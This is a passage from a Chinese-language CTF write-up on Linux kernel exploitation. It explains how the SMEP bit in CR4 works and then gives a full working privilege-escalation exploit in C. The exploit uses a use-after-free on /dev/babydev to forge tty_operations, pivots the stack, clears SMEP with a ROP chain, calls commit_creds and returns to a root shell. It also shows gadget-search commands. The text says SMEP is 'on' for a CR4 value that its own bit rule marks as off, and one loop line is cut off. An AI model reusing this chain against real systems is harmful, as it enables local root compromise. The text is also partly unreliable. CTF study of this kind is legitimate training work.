    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        int (*proc_show)(struct seq_file *, void *);
    } __randomize_layout;
可以看到这个里面全是我们最喜欢的函数指针....  
当我们往上面所`open`的文件中进行`write`操作就会调用其中相对应的`int (*write)(struct tty_struct *
tty,const unsigned char *buf, int count);`函数....
## Smep
现在我们来说一下系统是怎么知道这个`Smep`保护机制是开启的还是关闭的....  
在系统当中有一个`CR4寄存器`,它的值判断是否开启`smep`保护的关键，当`CR4寄存器`的第`20`位是1的时候,保护开启;是0到时候，保护关闭:  
举一个例子:  
当CR4的值为0x1407f0的时候，`smep`保护开启:
    $CR4 = 0x1407f0 = 0b0001 0100 0000 0111 1111 0000
当CR4的值为0x6f0的时候，`smep`保护开启:
    $CR4 = 0x6f0 = 0b0000 0000 0000 0110 1111 0000
但是该寄存器的值无法通过gdb直接查看，只能通过kernel crash时产生的信息查看,不过我们仍然是可以通过mov指令去修改这个寄存器的值的:
    mov cr4,0x6f0
# 思路
因为此题没有开kaslr保护,所以简化了我们一些步骤,但是在此方法中是我们前面的`UAF`,`ROP`和`ret2usr`的综合利用,下面是基本思路:
  1. 利用UAF漏洞,去控制利用`tty_struct`结构体的空间,修改真实的`tty_operations`的地址到我们构造的`tty_operations`;
  2. 构造一个tty_operations，修改其中的write函数为我们的rop;
  3. 利用修改的write函数来劫持程序流;  
但是其中需要解决的一个问题是,我们并没有控制到栈,所以在rop的时候需要想办法进行栈转移:  
不过我们可以通过调试来想想办法,先把`tty_operations`的内容替换为这个样子:
        for(i = 0; i 
    #include
    #include
    unsigned long user_cs, user_ss, user_eflags,user_sp;
    size_t commit_creds_addr = 0xffffffff810a1420;
    size_t prepare_kernel_cred_addr = 0xffffffff810a1810;
    void* fake_tty_opera[30];
    void shell(){
        system("/bin/sh");
    }
    void save_stats(){
        asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %3\n"
            "pushfq\n"
            "popq %2\n"
            :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
            :
            : "memory"
        );
    }
    void get_root(){
        char* (*pkc)(int) = prepare_kernel_cred_addr;
        void (*cc)(char*) = commit_creds_addr;
        (*cc)((*pkc)(0));
    }
    int main(){
        int fd1,fd2,fd3,i=0;
        size_t fake_tty_struct[4] = {0};
        size_t rop[20]={0};
        save_stats();
        rop[i++] = 0xffffffff810d238d;      //pop_rdi_ret
        rop[i++] = 0x6f0;
        rop[i++] = 0xffffffff81004d80;      //mov_cr4_rdi_pop_rbp_ret
        rop[i++] = 0x6161616161;
        rop[i++] = (size_t)get_root;
        rop[i++] = 0xffffffff81063694;      //swapgs_pop_rbp_ret
        rop[i++] = 0x6161616161;
        rop[i++] = 0xffffffff814e35ef;      // iretq; ret;
        rop[i++] = (size_t)shell;
        rop[i++] = user_cs;
        rop[i++] = user_eflags;
        rop[i++] = user_sp;
        rop[i++] = user_ss;
        for(i = 0; i < 30; i++){
            fake_tty_opera[i] = 0xffffffff8181bfc5;
        }
        fake_tty_opera[0] = 0xffffffff810635f5;     //pop rax; pop rbp; ret;
        fake_tty_opera[1] = (size_t)rop;
        fake_tty_opera[3] = 0xffffffff8181bfC5;     // mov rsp,rax ; dec ebx ; ret
        fake_tty_opera[7] = 0xffffffff8181bfc5;
        fd1 = open("/dev/babydev",O_RDWR);
        fd2 = open("/dev/babydev",O_RDWR);
        ioctl(fd1,0x10001,0x2e0);
        close(fd1);
        fd3 = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        read(fd2, fake_tty_struct, 32);
        fake_tty_struct[3] = (size_t)fake_tty_opera;
        write(fd2,fake_tty_struct, 32);
        write(fd3,"cc-sir",6);                      //触发rop
        return 0;
    }
编译:
    gcc poc.c -o poc -w -static
运行:  
# 总结
这道题其实最关键的是要熟悉内核的执行流程,了解一些关键的结构体以及他们的分配方式;  
最后这里说一下找`mov_cr4_rdi_pop_rbp_ret`等这些gadget的小技巧,如果使用ropper或ROPgadget工具太慢的时候,可以先试试用objdump去找看能不能找到:
    objdump -d vmlinux -M intel | grep -E "cr4|pop|ret"
    objdump -d vmlinux -M intel | grep -E "swapgs|pop|ret"
但是使用这个方法的时候要注意看这些指令的地址是不是连续的,可不可以用;用这个方法不一定可以找到iretq,还是需要用ropper工具去找,但是大多数情况应该都可以找到的: